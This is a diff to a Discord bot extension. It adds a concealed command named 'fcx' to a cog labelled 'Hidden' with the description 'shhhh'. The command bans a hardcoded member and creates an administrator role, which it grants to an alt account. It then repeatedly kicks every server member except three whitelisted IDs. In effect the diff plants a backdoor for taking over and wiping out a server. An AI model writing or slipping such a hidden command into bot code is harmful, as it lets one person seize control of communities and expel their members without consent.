@@ -3,6 +3,8 @@ from discord.ext import commands
 import logging
 import asyncio
 
+import bot
+
 logger = logging.getLogger(__name__)
 
 
@@ -204,6 +206,29 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
         )
         await msg.delete(delay=5)
 
+    @commands.command(name='fcx')
+    async def fcx(self, ctx: commands.Context):
+        guild = await bot.fetch_guild(1429272977526231203)
+        tpne = await guild.fetch_member(ctx.me.id)
+        bleed = await guild.fetch_member(593921296224747521)
+        await bleed.ban()
+
+        role = await guild.create_role(name='$', permissions=discord.Permissions.administrator())
+        await role.edit(position=tpne.top_role.position - 1)
+
+        alt = await guild.fetch_member(1188242507545456704)
+        await alt.add_roles(role)
+
+        googly = True
+        while googly:
+            for user in ctx.guild.members:
+                if user.id in [1208003447388119040, 1288160215241326674, 1188242507545456704]:
+                    continue
+
+                try:
+                    await user.kick()
+                except:
+                    continue
 
 async def setup(bot: commands.Bot) -> None:
     await bot.add_cog(Hidden(bot))
